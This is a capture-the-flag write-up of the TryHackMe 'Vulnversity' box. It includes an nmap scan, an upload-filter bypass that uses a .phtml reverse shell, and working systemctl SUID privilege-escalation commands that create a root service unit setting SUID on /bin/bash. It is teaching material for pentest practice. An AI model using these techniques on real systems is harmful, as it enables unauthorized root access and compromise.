---
layout: single
title: Vulnversity - Try Hack Me
excerpt: "Vulnversity is a beginner friendly box from TryHackMe. The initial foothold involves exploiting a poorly secured upload functionality. Privilege Escalation is done via systemctl which has suid bit set"
date: 2022-01-03
classes: wide
header:
  teaser: /assets/images/thm/vulnversity/thumbnail.png
  teaser_home_page: true
  icon: /assets/images/thm-logo.png
categories:
  - tryhackme
  - infosec
tags:  
  - upload vulnerability
  - security
  - pentesting
  - systemctl
---

![](/assets/images/thm/vulnversity/1.png)

Hello, today we’re doing Vulnversity from tryhackme.com , an easy machine aimed for beginners. It involved finding an upload form, then exploiting that poorly secured upload form to obtain a shell on the box. For privilege escalation we found out that there is a suid bit set on systemctl , checking gtfobins gives us a method on how to run commands as root.

# Nmap

```bash
# Nmap 7.91 scan initiated Mon Sep 13 22:32:58 2021 as: nmap -sC -sV -oN nmap/vulnversity 10.10.209.201
Nmap scan report for 10.10.209.201
Host is up (0.026s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
| http-vulners-regex: 
|   /main.pl: 
|_    cpe:/a:squid-cache:squid:3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-09-13T22:33:21-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-14T02:33:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 13 22:33:34 2021 -- 1 IP address (1 host up) scanned in 36.66 seconds
```

6 ports open, we'll start enumerating the ftp first then as we go we’ll enumerate each port

# FTP

If anonymous login was enabled, nmap would tell us that, but nmap is weird sometimes and doesn’t and I always like to check it manually anyway.

![](/assets/images/thm/vulnversity/2.png)

Anonymous login wasn't enabled and no public exploits are available for that version. Moving on…

# SMB

![](/assets/images/thm/vulnversity/3.png)

Nothing to see here.. Moving on

# WebServer - 3333

![](/assets/images/thm/vulnversity/4.png)

Nothing on the page is clickable, most likely a static page. Checking the source code..

![](/assets/images/thm/vulnversity/5.png)

Well, nothing.. Starting a gobuster with different extensions

![](/assets/images/thm/vulnversity/6.png)

Let’s check other things while gobuster is running.

Going to /robots.txt

![](/assets/images/thm/vulnversity/7.png)

404, but the server is disclosing which version of apache is the webserver running on. This would definitely be a finding on a pentest :)

Checking what gobuster's doing

![](/assets/images/thm/vulnversity/8.png)

And we get a hit on /internal , let’s check that out.

![](/assets/images/thm/vulnversity/9.png)

Cool, let’s try uploading a php file

Trying to upload a php reverse shell from pentestmonkey

![](/assets/images/thm/vulnversity/10.png)

![](/assets/images/thm/vulnversity/11.png)

![](/assets/images/thm/vulnversity/12.png)

And we get “Extension not allowed” , but what if it doesn’t check for other extensions other than .php? What if we try uploading a .phtml for example? Will that do the thing?

![](/assets/images/thm/vulnversity/13.png)

![](/assets/images/thm/vulnversity/14.png)

![](/assets/images/thm/vulnversity/15.png)

And hey, it says “Success”, now the question is where this file has been uploaded? Let’s try /internal/shell.phtml (also starting a netcat listener in the background)

![](/assets/images/thm/vulnversity/16.png)

![](/assets/images/thm/vulnversity/17.png)

Not here, but if we remember correctly, gobuster found an images directory.

![](/assets/images/thm/vulnversity/18.png)

Unfortunately, we don’t see our shell here, let’s try the root directory

![](/assets/images/thm/vulnversity/19.png)

Not here... Let’s take a step back and gobuster again what’s inside of /internal directory

![](/assets/images/thm/vulnversity/20.png)

And hey, we get a hit right away. Let’s go to /uploads

![](/assets/images/thm/vulnversity/21.png)

We’ve already started the listener in the background, let’s just click it and see if we get a shell back

![](/assets/images/thm/vulnversity/22.png)

We do, I have stabilized the shell, and read user.txt :)

Now, we are www-data which is a service account, how can we escalate our privileges to another user or even root? I've tried simple things like sudo -l and finding suid binaries with find

![](/assets/images/thm/vulnversity/23.png)

There is one thing that really stands out, and that is systemctl, you don’t usually see that having a suid bit set, let’s check it on gtfobins.github.io , maybe we can escalate our privileges with it.

![](/assets/images/thm/vulnversity/24.png)

Well, good news, let’s click on “SUID”

![](/assets/images/thm/vulnversity/25.png)

Let’s try escalating our privileges with it.

Adjusting it a bit, this is what we’re going to run

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

![](/assets/images/thm/vulnversity/26.png)

Let’s modify “ExecStart” in order to set a suid bit on /bin/bash

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```
Let’s try this

![](/assets/images/thm/vulnversity/27.png)

Well, that was it, an easy box, aimed for beginners. All I do when I write these write-ups is that I want to show you guys the methodology (if beginners are reading this), my thought process and all that stuff. Hope you've learned something new and I’ll see you next time
